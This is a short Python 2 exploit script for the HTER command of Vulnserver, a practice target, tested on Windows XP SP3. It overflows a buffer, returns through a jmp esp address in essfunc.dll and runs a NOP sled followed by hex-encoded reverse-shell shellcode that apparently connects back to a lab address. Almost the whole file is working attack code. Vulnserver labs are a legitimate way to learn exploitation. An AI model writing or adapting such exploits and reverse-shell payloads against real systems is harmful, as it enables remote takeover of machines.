# Exploit for Vulnserver HTER - Custom Reverse Shell
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

Custom_rev_shell = "31c050505031dbb3065340504050bb6a8bab71ffd39668c0a888806668232931db80c302665389e26a165256bb074aab71ffd3ba63636d64c1ea085289e183ec1089e356565631d2525231c040c1c008505252525252525252525231c0042c5089e0535052525231c0405052525152bb6b23807cffd3"

nops = 28 * "90"

cmd      = "HTER "
buffer1  = "A" * 2041
buffer1 += "af115062"   # 0x625011af : jmp esp in essfunc.dll
buffer2  = "C" * (3000-len(buffer1+Custom_rev_shell+nops))

buffer = cmd + buffer1 + nops + Custom_rev_shell + buffer2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
